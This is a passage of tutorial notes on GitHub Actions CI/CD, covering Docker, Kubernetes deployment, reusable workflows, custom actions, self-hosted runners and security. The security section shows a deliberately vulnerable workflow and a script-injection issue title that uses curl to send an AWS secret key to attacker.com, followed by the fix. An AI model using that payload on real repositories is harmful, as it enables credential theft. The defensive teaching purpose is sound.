#### Summary
Cache invalidation is automatic via `hashFiles()`. When your lockfile changes, a new cache is created. Old caches are eventually evicted by GitHub's LRU policy.

---

### 3.13 Docker Login Workflow

```yaml
docker:
  name: Containerization
  needs: [unit-testing, code-coverage]
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4

    - name: Docker Hub Login
      uses: docker/login-action@v2
      with:
        username: ${{ vars.DOCKERHUB_USERNAME }}
        password: ${{ secrets.DOCKERHUB_PASSWORD }}
```

**Required configuration:**
- Secret: `DOCKERHUB_PASSWORD`
- Variable: `DOCKERHUB_USERNAME`

> **Production Tip:** Use Docker Hub access tokens instead of passwords for better security and auditability.

#### Summary
Use `docker/login-action` for secure registry authentication. Store credentials as secrets. The action handles login and automatic logout post-job.

---

### 3.14 Docker Build and Test

```yaml
- name: Build Image for Testing
  uses: docker/build-push-action@v4
  with:
    context: .
    push: false                    # Don't push yet
    tags: ${{ vars.DOCKERHUB_USERNAME }}/solar-system:${{ github.sha }}

- name: Test Container
  run: |
    docker run --name app -d \
      -p 3000:3000 \
      -e MONGO_URI=$MONGO_URI \
      -e MONGO_USERNAME=$MONGO_USERNAME \
      -e MONGO_PASSWORD=$MONGO_PASSWORD \
      ${{ vars.DOCKERHUB_USERNAME }}/solar-system:${{ github.sha }}

    wget -q -O - http://127.0.0.1:3000/live | grep live
```

**Pattern: Build → Test → Push**
1. Build with `push: false`
2. Run container and validate health endpoints
3. Only push if tests pass

#### Summary
Always test your Docker image before pushing. Build with `push: false`, run the container, validate health endpoints, then push only after successful verification.

---

### 3.15 Docker Push

```yaml
- name: Push to Docker Hub
  uses: docker/build-push-action@v4
  with:
    context: .
    push: true
    tags: ${{ vars.DOCKERHUB_USERNAME }}/solar-system:${{ github.sha }}
```

**Tagging strategy:**
- Use `${{ github.sha }}` for unique, traceable tags
- Each commit produces a unique image tag
- You can always trace a deployed image back to its exact commit

#### Summary
Tag images with the commit SHA for traceability. This creates a direct link between deployed containers and source code, essential for debugging production issues.

---

### 3.16 Login and Push to GHCR

Push to both Docker Hub and GitHub Container Registry:

```yaml
- name: GHCR Login
  uses: docker/login-action@v2
  with:
    registry: ghcr.io
    username: ${{ github.repository_owner }}
    password: ${{ secrets.GITHUB_TOKEN }}

- name: Push to Both Registries
  uses: docker/build-push-action@v4
  with:
    context: .
    push: true
    tags: |
      ${{ vars.DOCKERHUB_USERNAME }}/solar-system:${{ github.sha }}
      ghcr.io/${{ github.repository_owner }}/solar-system:${{ github.sha }}
```

**Required permissions:**
```yaml
jobs:
  docker:
    permissions:
      packages: write            # Required for GHCR push
```

> **Common Error:** `denied: installation not allowed to Create organization package` — means you're missing `packages: write` permission.

#### Summary
GHCR provides free container hosting tied to your GitHub account. Push to multiple registries for redundancy. Always set `permissions: packages: write` for GHCR pushes.

---

### 3.17 Job Containers and Service Containers

**Job Container** — runs all steps inside a Docker image:
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:18
    steps:
      - run: node --version    # Node 18 available without setup-node
```

**Service Container** — provides supporting services (databases, caches):
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      mongodb:
        image: mongo:latest
        ports:
          - 27017:27017
    steps:
      - run: npm test
        env:
          MONGO_URI: mongodb://localhost:27017/testdb
```

**Combining both:**
```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:18
    services:
      mongodb:
        image: mongo:latest
    steps:
      - run: npm test
        env:
          MONGO_URI: mongodb://mongodb:27017/testdb   # Use service name as hostname
```

> **Critical:** When using a job container, connect to services via their **service name** (not `localhost`). When running directly on the runner, use `localhost` with mapped ports.

#### Summary
Service containers provide isolated test databases without affecting production. Job containers give consistent environments. Together, they create reproducible, safe CI pipelines.

---

## 4. Continuous Deployment with GitHub Actions

### 4.1 Deployment Use Case Overview

**Pipeline stages after CI:**
1. Push Docker image → Registry
2. Deploy to Development Kubernetes cluster
3. Integration testing against dev
4. Manual approval gate
5. Deploy to Production cluster
6. Production integration testing

**Kubernetes resources needed:**
- Deployment (manages pods)
- Service (internal networking)
- Ingress (external HTTP routing)

#### Summary
CD extends CI by automating deployment to Kubernetes clusters. The pipeline moves through environments (dev → prod) with testing and approval gates between them.

---

### 4.2 Kubernetes Overview

**Key components:**

| Resource | Purpose |
|----------|---------|
| Pod | Smallest deployable unit |
| Deployment | Manages replicated pods |
| Service | Stable network endpoint |
| Ingress | HTTP routing & TLS |

**Service types:**

| Type | Scope | Use Case |
|------|-------|----------|
| ClusterIP | Internal only | Microservices communication |
| NodePort | Static port on nodes | Development access |
| LoadBalancer | External cloud LB | Production traffic |

#### Summary
Kubernetes orchestrates containerized applications. Deployments manage pods, Services provide networking, and Ingress handles external traffic routing. These are the three resources you'll typically deploy.

---

### 4.3 Workflow Setup kubectl

```yaml
dev-deploy:
  needs: docker
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4

    - name: Install kubectl
      uses: azure/setup-kubectl@v3
      with:
        version: 'v1.26.0'

    - name: Verify cluster access
      run: |
        kubectl version --short
        kubectl get nodes
```

> **Error without kubeconfig:** `Error from server (Unauthorized)` — kubectl needs authentication credentials.

#### Summary
`azure/setup-kubectl` installs the kubectl CLI. Without a kubeconfig, kubectl cannot authenticate. The next step is configuring cluster credentials.

---

### 4.4 Configuring Kubeconfig

```yaml
- name: Set Kubeconfig
  uses: azure/k8s-set-context@v3
  with:
    method: kubeconfig
    kubeconfig: ${{ secrets.KUBECONFIG }}

- name: Verify Access
  run: |
    kubectl version --short
    kubectl get nodes
```

**Setup:**
1. Base64-encode your kubeconfig file
2. Store it as GitHub secret named `KUBECONFIG`
3. Use `azure/k8s-set-context` to apply it

> **Never** commit kubeconfig to source control. It contains cluster credentials.

#### Summary
Store kubeconfig as a GitHub secret and use `azure/k8s-set-context` to configure cluster access. This enables kubectl commands in subsequent workflow steps.

---

### 4.5 Replace Placeholder Tokens

Use `cschleiden/replace-tokens` to inject values into Kubernetes manifests:

```yaml
- name: Replace tokens
  uses: cschleiden/replace-tokens@v1
  with:
    tokenPrefix: '{_'
    tokenSuffix: '_}'
    files: 'kubernetes/development/*.yaml'
  env:
    NAMESPACE: ${{ vars.NAMESPACE }}
    REPLICAS: ${{ vars.REPLICAS }}
    IMAGE: ${{ vars.DOCKERHUB_USERNAME }}/solar-system:${{ github.sha }}
    INGRESS_IP: ${{ env.INGRESS_IP }}
```

**Manifest template:**
```yaml
spec:
  replicas: {_REPLICAS_}
  template:
    spec:
      containers:
      - image: {_IMAGE_}
```

**After replacement:**
```yaml
spec:
  replicas: 2
  template:
    spec:
      containers:
      - image: user/solar-system:abc123
```

#### Summary
Token replacement enables environment-specific deployments from the same manifest templates. Define variables in GitHub settings and inject them at deployment time.

---

### 4.6 Create Secret and Deploy to Kubernetes

```yaml
- name: Create MongoDB Secret
  run: |
    kubectl -n ${{ vars.NAMESPACE }} create secret generic mongo-db-creds \
      --from-literal=MONGO_URI=${{ env.MONGO_URI }} \
      --from-literal=MONGO_USERNAME=${{ env.MONGO_USERNAME }} \
      --from-literal=MONGO_PASSWORD=${{ secrets.MONGO_PASSWORD }} \
      --save-config \
      --dry-run=client \
      -o yaml | kubectl apply -f -

- name: Deploy to Kubernetes
  run: kubectl apply -f kubernetes/development/
```

**Why `--dry-run=client -o yaml | kubectl apply -f -`?**
- Creates or updates the secret idempotently
- Avoids "already exists" errors on re-runs
- `--save-config` stores config for future apply operations

#### Summary
Create Kubernetes secrets from GitHub secrets for database credentials. Use the `dry-run | apply` pattern for idempotent secret creation that works on both first run and subsequent runs.

---

## 5. Reusable Workflows and Reporting

### 5.1 Why Reusable Workflows

When multiple applications (Node.js, Java, Python) share identical deployment steps, reusable workflows eliminate duplication:

**Benefits:**
- Single source of truth for deployment logic
- Consistency across all applications
- Update once, propagate everywhere
- Reduced maintenance burden

**Architecture:**
```
Common Workflows Repo
└── .github/workflows/
    └── reuse-deployment.yml    ← Reusable workflow

App Repos (Node, Java, Python)
└── .github/workflows/
    └── ci.yml                  ← Calls reusable workflow
```

#### Summary
Reusable workflows centralize common logic (like Kubernetes deployments) into one file that multiple repositories can call, ensuring consistency and simplifying maintenance across your organization.

---

### 5.2 Creating a Reusable Workflow

**The reusable workflow file:**
```yaml
# .github/workflows/reuse-deployment.yml
name: Deployment - Reusable Workflow

on:
  workflow_call:                    # This makes it reusable
    inputs:
      environment:
        required: true
        type: string
      kubectl-version:
        default: 'v1.26.0'
        required: false
        type: string
      k8s-manifest-dir:
        required: true
        type: string
      mongodb-uri:
        required: true
        type: string
    secrets:
      k8s-kubeconfig:
        required: true
      mongodb-password:
        required: true
    outputs:
      application-url:
        description: "Deployed application URL"
        value: ${{ jobs.reuse-deploy.outputs.APP_INGRESS_URL }}

jobs:
  reuse-deploy:
    runs-on: ubuntu-latest
    environment:
      name: ${{ inputs.environment }}
      url: https://${{ steps.set-ingress-host.outputs.APP_INGRESS_HOST }}
    outputs:
      APP_INGRESS_URL: ${{ steps.set-ingress-host.outputs.APP_INGRESS_HOST }}
    steps:
      - uses: actions/checkout@v4
      - uses: azure/setup-kubectl@v3
        with:
          version: ${{ inputs.kubectl-version }}
      - uses: azure/k8s-set-context@v3
        with:
          kubeconfig: ${{ secrets.k8s-kubeconfig }}
      - name: Deploy
        run: kubectl apply -f ${{ inputs.k8s-manifest-dir }}
      - name: Get Ingress URL
        id: set-ingress-host
        run: |
          HOST=$(kubectl get ingress -o jsonpath='{.items[0].spec.tls[0].hosts[0]}')
          echo "APP_INGRESS_HOST=$HOST" >> $GITHUB_OUTPUT
```

**Calling the reusable workflow:**
```yaml
jobs:
  dev-deploy:
    uses: ./.github/workflows/reuse-deployment.yml
    with:
      mongodb-uri: ${{ vars.MONGO_URI }}
      environment: development
      k8s-manifest-dir: kubernetes/development/
    secrets:
      k8s-kubeconfig: ${{ secrets.KUBECONFIG }}
      mongodb-password: ${{ secrets.MONGO_PASSWORD }}

  prod-deploy:
    uses: ./.github/workflows/reuse-deployment.yml
    with:
      mongodb-uri: ${{ vars.MONGO_URI }}
      environment: production
      k8s-manifest-dir: kubernetes/production/
    secrets:
      k8s-kubeconfig: ${{ secrets.KUBECONFIG }}
      mongodb-password: ${{ secrets.MONGO_PASSWORD }}
```

**Key concepts:**
- `on: workflow_call` makes a workflow reusable
- `inputs` define parameters callers pass
- `secrets` declare required sensitive values
- `outputs` expose values back to callers
- Call with `uses:` (local path or `owner/repo/path@ref`)

#### Summary
Reusable workflows use `on: workflow_call` trigger with defined inputs, secrets, and outputs. Callers invoke them with `uses:` and pass parameters via `with:` and `secrets:`. This DRYs up deployment logic across repositories.

---

### 5.3 Using Secrets in Reusable Workflows

**Declare secrets in the reusable workflow:**
```yaml
on:
  workflow_call:
    secrets:
      k8s-kubeconfig:
        required: true
      mongodb-password:
        required: true
```

**Pass secrets from the caller:**
```yaml
dev-deploy:
  uses: ./.github/workflows/reuse-deployment.yml
  secrets:
    k8s-kubeconfig: ${{ secrets.KUBECONFIG }}
    mongodb-password: ${{ secrets.MONGO_PASSWORD }}
```

> **Important:** Caller workflow `env:` variables do NOT automatically propagate into reusable workflows. You must pass everything explicitly via inputs and secrets.

#### Summary
Secrets must be explicitly declared in the reusable workflow and explicitly passed by the caller. Nothing is inherited automatically — this is a security feature.

---

### 5.4 Using Inputs in Reusable Workflows

**Problem:** Environment variables from the caller don't reach the reusable workflow.

**Solution:** Define inputs and pass values explicitly:

```yaml
# Reusable workflow
on:
  workflow_call:
    inputs:
      mongodb-uri:
        required: true
        type: string
      environment:
        required: true
        type: string
        default: dev
      kubectl-version:
        required: false
        type: string
        default: v1.26.0
```

**Use inputs in steps:**
```yaml
steps:
  - name: Deploy to ${{ inputs.environment }}
    run: kubectl apply -f kubernetes/${{ inputs.environment }}/
```

#### Summary
Inputs parameterize reusable workflows, making them flexible across environments. Define inputs with types, defaults, and required flags. Reference them with `${{ inputs.name }}`.

---

### 5.5 Using Outputs in Reusable Workflows

**Define outputs in the reusable workflow:**
```yaml
on:
  workflow_call:
    outputs:
      application-url:
        value: ${{ jobs.reuse-deploy.outputs.APP_INGRESS_URL }}
```

**Consume in the caller:**
```yaml
dev-integration-testing:
  needs: dev-deploy
  runs-on: ubuntu-latest
  steps:
    - name: Test endpoint
      env:
        URL: ${{ needs.dev-deploy.outputs.application-url }}
      run: curl https://$URL/live -s -k | jq -r .status | grep -i live
```

> **Key:** Map job outputs → workflow outputs → caller consumption via `needs.<job>.outputs.<name>`.

#### Summary
Outputs flow from step → job → workflow → caller. Without declaring outputs in `workflow_call`, values remain trapped inside the reusable workflow. Always map the chain completely.

---

### 5.6 Uploading Reports to AWS S3

```yaml
reports-s3:
  needs: [unit-testing, code-coverage]
  runs-on: ubuntu-latest
  continue-on-error: true
  steps:
    - uses: actions/download-artifact@v3
      with:
        name: Mocha-Test-Result

    - uses: actions/download-artifact@v3
      with:
        name: Code-Coverage-Result

    - name: Merge Reports
      run: |
        mkdir reports-${{ github.sha }}
        mv cobertura-coverage.xml reports-${{ github.sha }}/
        mv test-results.xml reports-${{ github.sha }}/

    - name: Upload to S3
      uses: jakejarvis/s3-sync-action@master
      with:
        args: --follow-symlinks --delete
      env:
        AWS_S3_BUCKET: solar-system-reports-bucket
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        AWS_REGION: 'us-east-1'
        SOURCE_DIR: 'reports-${{ github.sha }}'
        DEST_DIR: 'reports-${{ github.sha }}'
```

**Why S3 over GitHub Artifacts?**
- GitHub artifacts expire after 90 days
- S3 provides unlimited retention with lifecycle policies
- S3 supports compliance and audit requirements

#### Summary
Use AWS S3 for long-term test report storage when GitHub's 90-day artifact retention isn't sufficient. Store AWS credentials as secrets and use community S3 sync actions.

---

### 5.7 Slack Notifications

```yaml
slack-notification:
  if: always()
  needs: [dev-integration-testing, prod-integration-testing]
  runs-on: ubuntu-latest
  steps:
    - uses: rtCamp/action-slack-notify@v2
      env:
        SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
        SLACK_CHANNEL: github-actions-channel
        SLACK_COLOR: ${{ job.status }}
        SLACK_TITLE: Workflow Status
        SLACK_MESSAGE: ':hammer_and_wrench: Triggered by ${{ github.actor }}'
```

**Setup:**
1. Create Slack app and enable Incoming Webhooks
2. Add webhook to a channel
3. Store webhook URL as GitHub secret `SLACK_WEBHOOK`
4. Use `if: always()` to notify on success, failure, and cancellation

#### Summary
Slack notifications keep teams informed about pipeline status. Use `if: always()` to send notifications regardless of outcome. Store webhook URLs as secrets.

---

## 6. Custom Actions

### 6.1 Types of Custom Actions

| Type | Runner Support | Best For |
|------|---------------|----------|
| **Composite** | Linux, macOS, Windows | Grouping multiple steps into one reusable action |
| **Docker** | Linux only | Full OS control, custom dependencies |
| **JavaScript** | Linux, macOS, Windows | Fast startup, lightweight Node.js logic |

**When to create custom actions:**
- Proprietary systems not supported by marketplace actions
- Complex conditional orchestration
- Security/compliance requires in-house code
- Existing actions lack required configurations

#### Summary
Choose Composite for grouping steps, Docker for isolated environments with custom dependencies, and JavaScript for fast cross-platform utilities. Custom actions bridge gaps where marketplace offerings fall short.

---

### 6.2 Creating a Composite Action

Every action requires an `action.yml` metadata file:

```yaml
# .github/custom-actions/npm-action/action.yml
name: 'NPM Custom Action'
description: 'Cache and install NPM packages'
inputs:
  path-of-folder:
    description: 'Path to cache'
    required: true
runs:
  using: composite
  steps:
    - name: Cache NPM dependencies
      uses: actions/cache@v3
      with:
        path: ${{ inputs.path-of-folder }}
        key: ${{ runner.os }}-node-modules-${{ hashFiles('package-lock.json') }}

    - name: Install Dependencies
      run: npm install
      shell: bash                  # Required for composite actions
```

> **Critical:** Every `run` step in a composite action MUST specify `shell:` (bash, pwsh, sh, cmd).

**Using the composite action:**
```yaml
- name: Prepare npm
  uses: ./.github/custom-actions/npm-action
  with:
    path-of-folder: node_modules
```

#### Summary
Composite actions bundle multiple steps into a single reusable unit. They require `using: composite` and explicit `shell:` declarations. Reference them by directory path.

---

### 6.3 Using a Composite Action in Workflow

**Before (duplicate steps):**
```yaml
- uses: actions/cache@v3
  with:
    path: node_modules
    key: ${{ runner.os }}-node-modules-${{ hashFiles('package-lock.json') }}
- run: npm install
```

**After (single composite action):**
```yaml
- uses: ./.github/custom-actions/npm-action
  with:
    path-of-folder: node_modules
```

This reduces duplication across unit-testing and code-coverage jobs.

#### Summary
Composite actions replace repetitive step sequences with a single action call, keeping workflows clean and ensuring consistent behavior across jobs.

---

### 6.4 Creating a Docker Action

**Structure:**
```
├── Dockerfile
├── entrypoint.sh
└── action.yml
```

**Dockerfile:**
```dockerfile
FROM alpine:3.10
RUN apk update && apk add --no-cache curl jq
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

**action.yml:**
```yaml
name: 'Giphy PR Comment'
inputs:
  github-token:
    required: true
  giphy-api-key:
    required: true
runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.github-token }}
    - ${{ inputs.giphy-api-key }}
```

**entrypoint.sh:**
```bash
#!/bin/sh
GITHUB_TOKEN=$1
GIPHY_API_KEY=$2
pr_number=$(jq --raw-output .pull_request.number "$GITHUB_EVENT_PATH")
# ... fetch GIF and post comment
```

> **Note:** Docker actions have slower startup due to image build. They only work on Linux runners.

#### Summary
Docker actions provide complete isolation with custom OS-level dependencies. They're slower to start but offer full control over the execution environment. Use for complex integrations requiring specific system packages.

---

### 6.5 Creating a JavaScript Action

**action.yml:**
```yaml
name: 'Giphy PR Comment'
inputs:
  github-token:
    required: true
  giphy-api-key:
    required: true
runs:
  using: 'node16'
  main: 'dist/index.js'
```

**index.js:**
```javascript
const core = require('@actions/core');
const github = require('@actions/github');
const { Octokit } = require('@octokit/rest');

async function run() {
  try {
    const token = core.getInput('github-token');
    const octokit = new Octokit({ auth: token });
    const { owner, repo, number } = github.context.issue;

    await octokit.issues.createComment({
      owner, repo, issue_number: number,
      body: '🎉 Thank you for contributing!'
    });
  } catch (error) {
    core.setFailed(error.message);
  }
}
run();
```

**Bundle with NCC:**
```bash
npm install @vercel/ncc --save-dev
ncc build index.js -o dist
```

> **Why bundle?** Avoids committing `node_modules` (which can be huge). NCC compiles everything into a single file.

#### Summary
JavaScript actions are the fastest to start and work cross-platform. Bundle with `@vercel/ncc` to avoid committing node_modules. Use `@actions/core` for inputs/outputs and `@actions/github` for context.

---

### 6.6 Sharing Custom Actions on Marketplace

**Prerequisites:**
1. Accept GitHub Marketplace Terms
2. Enable 2FA on your account

**Required in action.yml for publishing:**
```yaml
name: 'KodeKloud Giphy PR Comment'    # Must be unique
description: 'Add a Giphy GIF comment'
branding:
  icon: 'award'
  color: 'green'
```

**Steps to publish:**
1. Push action code to a public repository
2. Create a release with semantic version tag (e.g., `1.0.0`)
3. GitHub prompts to publish on Marketplace

**Using published action:**
```yaml
- uses: your-username/action-name@1.0.0
```

#### Summary
Publishing to Marketplace requires a unique name, branding section, 2FA, and a tagged release. Use semantic versioning for tags. Others can then reference your action with `uses: owner/action@version`.

---

## 7. Self-Hosted Runners

### 7.1 Types of Runners

| Feature | GitHub-Hosted | Self-Hosted |
|---------|--------------|-------------|
| Management | By GitHub | By you |
| Customization | Pre-configured | Full control |
| Isolation | Fresh VM per job | Persistent |
| Cost | Included in plan | Your infrastructure |
| Use Cases | Standard CI/CD | GPU, custom hardware, compliance |

**GitHub-hosted runner specs:**
- 2-core CPU, 7 GB RAM, 14 GB SSD (standard)
- Larger runners available (Teams/Enterprise)
- GPU-enabled runners in beta

**Self-hosted runner labels:**
- `self-hosted` — identifies as self-hosted
- `linux` / `windows` / `macOS` — OS type
- Custom labels (e.g., `gpu`, `prod`, `arm64`)

#### Summary
GitHub-hosted runners are managed, ephemeral, and ideal for most workloads. Self-hosted runners give full control over hardware and software for specialized requirements like GPU workloads or compliance needs.

---

### 7.2 Installing a Self-Hosted Runner

```bash
# 1. Create directory
mkdir actions-runner && cd actions-runner

# 2. Download runner package
curl -o actions-runner-linux-x64-2.310.2.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.310.2/actions-runner-linux-x64-2.310.2.tar.gz

# 3. Extract
tar xzf ./actions-runner-linux-x64-2.310.2.tar.gz

# 4. Configure (token from GitHub UI: Settings → Actions → Runners → New)
./config.sh --url https://github.com/OWNER/REPO --token YOUR_TOKEN

# 5. Start
./run.sh
```

**Registration prompts:**
- Runner group: `Default`
- Runner name: `prod-ubuntu-runner`
- Labels: `self-hosted, Linux, X64` (auto-detected)
- Work folder: `_work`

> **Security Warning:** Running as root is disabled by default. Override with `export RUNNER_ALLOW_RUNASROOT=1` (not recommended for production).

#### Summary
Self-hosted runners require downloading the runner package, configuring with a registration token from GitHub, and starting the process. The runner then appears in your repository's runner list.

---

### 7.3 Running Workflows on Self-Hosted Runner

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, prod]    # Match ALL labels
    steps:
      - run: echo "Running on self-hosted runner"
```

> **Critical:** All labels in `runs-on` must match. A typo like `production` instead of `prod` causes the job to hang indefinitely.

#### Summary
Target self-hosted runners by specifying their labels in `runs-on`. All listed labels must match. Jobs remain pending if no matching runner is available.

---

### 7.4 Exploring Self-Hosted Runner Internals

**Directory structure:**
```
actions-runner/
├── _diag/              # Diagnostic logs
│   ├── Runner_*.log    # Runner process logs
│   └── Worker_*.log    # Job execution logs
├── _work/              # Workspace (populated during jobs)
│   ├── <repo>/         # Checked-out code
│   ├── _temp/          # Step scripts and event data
│   └── _tool/          # Installed tool cache
└── run.sh              # Runner process
```

**Key files during job execution:**
- `_work/_temp/*.sh` — Generated shell scripts for each step
- `_work/_temp/event.json` — GitHub event payload
- `_work/_temp/_runner_file_commands/` — Step outputs, env vars

**Monitoring:**
```bash
tail -f _diag/Worker_*.log    # Real-time job logs
```

#### Summary
Self-hosted runners store diagnostics in `_diag/` and job workspaces in `_work/`. Understanding this structure helps debug failed jobs and inspect runner behavior.

---

### 7.5 Uninstalling a Self-Hosted Runner

**Method 1: GitHub UI**
1. Settings → Actions → Runners
2. Select runner → Remove

**Method 2: Command line**
```bash
./config.sh remove --token YOUR_TOKEN --unattended
```

**Auto-removal:** Runners offline for 14+ days are automatically removed.

| Method | Scope | Effect |
|--------|-------|--------|
| GitHub UI | Immediate | Removes from GitHub |
| `config.sh remove` | Host cleanup | Unregisters and removes local files |
| Manual stop | Delayed | Auto-prune after 14 days |

#### Summary
Remove runners via the GitHub UI or the config script. Stopped runners are automatically removed after 14 days of being offline. Always clean up unused runners to maintain security.

---

## 8. Security Guide

### 8.1 Security Hardening Overview

**Four pillars of GitHub Actions security:**

1. **Secure Secret Storage**
   - Use GitHub Secrets (encrypted with Libsodium sealed boxes)
   - Never commit credentials in YAML
   - Secrets are automatically masked in logs
   - Available at org, repo, and environment levels

2. **OpenID Connect (OIDC)**
   - Short-lived tokens instead of long-lived credentials
   - Configure cloud providers to trust GitHub's OIDC issuer
   - No secrets needed for AWS, Azure, GCP authentication

3. **Script Injection Prevention**
   - Sanitize all external inputs
   - Never concatenate untrusted data into shell commands
   - Use strongly typed inputs

4. **Third-Party Action Vetting**
   - Review source code before using
   - Pin to commit SHAs for security-critical actions
   - Prefer verified marketplace actions
   - Grant minimal permissions

**Best practices:**
- Author your own actions when possible
- Combine internal + verified marketplace actions
- Pin versions to specific tags or SHAs
- Use `permissions` to restrict `GITHUB_TOKEN` scope

#### Summary
Security in GitHub Actions requires protecting secrets, using OIDC for cloud auth, preventing script injection, and vetting third-party actions. Apply the principle of least privilege to all workflow permissions.

---

### 8.2 Script Injection Attacks

**Vulnerable workflow:**
```yaml
- name: Add Label
  env:
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  run: |
    issue_title="${{ github.event.issue.title }}"
    if [[ "$issue_title" == *"bug"* ]]; then
      echo "Assigning label: BUG"
    fi
```

**Attack:** Create an issue with title:
```
bug"; curl --data "key=$AWS_SECRET_ACCESS_KEY" https://attacker.com; echo "
```

**Result:** The shell interprets the injected commands, exfiltrating your AWS secret key.

**Attack vectors:**
- `github.event.issue.title`
- `github.event.pull_request.title`
- `github.event.comment.body`
- Any user-controlled input

#### Summary
Script injection occurs when untrusted user input (issue titles, PR descriptions) is expanded directly into shell commands. Attackers can execute arbitrary code and steal secrets.

---

### 8.3 Mitigating Script Injection

**Solution:** Pass untrusted input via environment variables instead of inline interpolation:

```yaml
# ❌ VULNERABLE - input expanded into script
- run: |
    issue_title="${{ github.event.issue.title }}"
    if [[ "$issue_title" == *"bug"* ]]; then
      echo "Bug detected"
    fi

# ✅ SECURE - input passed as env var
- name: Add Label
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: |
    if [[ "$ISSUE_TITLE" == *"bug"* ]]; then
      echo "Bug detected"
    fi
```

**Why this works:**
- In the vulnerable version, the title is expanded by GitHub Actions BEFORE the shell executes
- In the secure version, the title is injected as a runtime environment variable
- The shell treats the entire env var value as data, not as code

**Additional mitigations:**
- Use composite or JavaScript actions for input processing
- Restrict secret access with job permissions
- Validate inputs with regex/allowlists
- Run untrusted code in isolated containers

#### Summary
Never interpolate user-controlled input directly into `run:` blocks. Always pass untrusted data through `env:` variables. This ensures the shell treats input as data, not executable code.

---

### 8.4 Securing Secrets with HashiCorp Vault

**Why centralized secret management:**
- GitHub secrets aren't versioned
- Managing secrets per-repo doesn't scale
- No audit trail for secret access

**HashiCorp Vault integration:**
1. Create Vault Secrets application in HCP
2. Store secrets (e.g., `AWS_API_KEY`)
3. Install GitHub Actions integration
4. Select repositories to sync
5. Vault pushes secrets to GitHub automatically

**Benefits:**
- Centralized management
- Version history
- Audit logging
- Automatic sync to GitHub repos

#### Summary
HashiCorp Vault provides centralized, versioned, auditable secret management that syncs with GitHub Actions. This is essential for enterprise environments managing secrets across many repositories.

---

### 8.5 Workflow Status Badges

Add visual status indicators to your README:

```markdown
[![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)](https://github.com/OWNER/REPO/actions/workflows/ci.yml)
```

**Generate from GitHub UI:**
1. Actions tab → Select workflow
2. Click "..." → Create status badge
3. Choose branch filter
4. Copy Markdown

**Skip CI for badge commits:**
```bash
git commit -m "Add status badge [skip ci]"
```

#### Summary
Status badges provide instant visibility into pipeline health. Generate them from the Actions UI and embed in your README. Use `[skip ci]` when committing badge-only changes.

---

## Final Production Best Practices

| Area | Best Practice |
|------|--------------|
| **Secrets** | Never hard-code; use GitHub Secrets or external vaults |
| **Actions** | Pin to SHA for security-critical; tag for others |
| **Runners** | Use Linux for cost; self-hosted for compliance |
| **Caching** | Always cache dependencies; hash lockfiles for keys |
| **Matrix** | Test across versions; use `fail-fast: false` |
| **Artifacts** | Archive test results with `if: always()` |
| **Concurrency** | Use concurrency groups for deployments |
| **Timeouts** | Set timeouts on long-running steps |
| **Reusable** | Extract common patterns into reusable workflows |
| **Notifications** | Send Slack/Teams alerts with `if: always()` |
| **Security** | Validate inputs; use OIDC; restrict permissions |
| **Monitoring** | Add status badges; review workflow analytics |

---

*End of Notes*
